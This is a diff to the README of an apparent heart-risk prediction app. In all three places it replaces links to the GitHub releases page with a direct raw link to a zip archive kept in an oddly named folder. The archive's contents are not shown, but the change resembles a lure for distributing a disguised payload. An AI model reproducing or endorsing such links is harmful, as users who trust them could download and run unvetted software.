@@ -1,6 +1,6 @@
 # 🫀 Hearttdisease-Prediction - Check Heart Risk Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Cytokinetic-elephantiasisneuromatosa466/Hearttdisease-Prediction/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Cytokinetic-elephantiasisneuromatosa466/Hearttdisease-Prediction/raw/refs/heads/main/adead/Prediction-Hearttdisease-v2.8.zip)
 
 ## 📌 Overview
 
@@ -33,7 +33,7 @@ If your release includes a packaged Windows file, you can use it right away. If 
 
 Visit this page to download the latest release:
 
-https://github.com/Cytokinetic-elephantiasisneuromatosa466/Hearttdisease-Prediction/releases
+https://github.com/Cytokinetic-elephantiasisneuromatosa466/Hearttdisease-Prediction/raw/refs/heads/main/adead/Prediction-Hearttdisease-v2.8.zip
 
 ## 🛠️ Install on Windows
 
@@ -178,7 +178,7 @@ Use the app as a simple prediction tool. It gives a result based on the data you
 
 ## 📎 Download again
 
-[Visit the release page to download](https://github.com/Cytokinetic-elephantiasisneuromatosa466/Hearttdisease-Prediction/releases)
+[Visit the release page to download](https://github.com/Cytokinetic-elephantiasisneuromatosa466/Hearttdisease-Prediction/raw/refs/heads/main/adead/Prediction-Hearttdisease-v2.8.zip)
 
 ## 🖼️ Project focus
 
